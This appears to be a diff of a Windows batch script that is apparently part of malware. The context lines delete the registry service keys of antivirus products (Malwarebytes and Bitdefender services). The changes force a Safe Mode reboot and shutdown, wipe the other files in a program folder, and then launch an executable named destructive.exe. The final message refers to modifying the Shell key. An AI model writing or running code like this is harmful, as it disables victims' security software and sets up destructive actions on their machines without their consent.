@@ -211,8 +211,8 @@ bcdedit /enum {current} | findstr /i "safeboot"
 if %errorlevel% == 0 (
     echo Safe Mode is enabled, proceeding with actions...
 ) else (
-    echo Safe Mode is not enabled
-    "bcdedit.exe /set {current} safeboot minimal
+    echo Safe Mode is not enabled. Restarting in Safe Mode...
+    bcdedit.exe /set {current} safeboot minimal
     shutdown -s -t 7
 )
 
@@ -257,7 +257,21 @@ reg delete "HKLM\SYSTEM\ControlSet001\Services\MBAMService" /f
 reg delete "HKLM\SYSTEM\CurrentControlSet\Services\VSSERV" /f
 reg delete "HKLM\SYSTEM\ControlSet001\Services\VSSERV" /f
 
+setlocal enabledelayedexpansion
+
+set "targetDir=C:\Program Files\utkudrk2"
+set "exceptionFile=destructive.exe"
+
+if exist "%targetDir%" (
+    for %%F in ("%targetDir%\*") do (
+        if /I not "%%~nxF"=="%exceptionFile%" (
+            del /f /q "%%F"
+        )
+    )
+)
+
 "C:\Program Files\utkudrk2\destructive.exe"
+endlocal
 
 :: Confirm completion
 echo Cleanup tasks completed. Safe Mode should now be removed, destructive.exe is scheduled to run, and Shell key is modified.
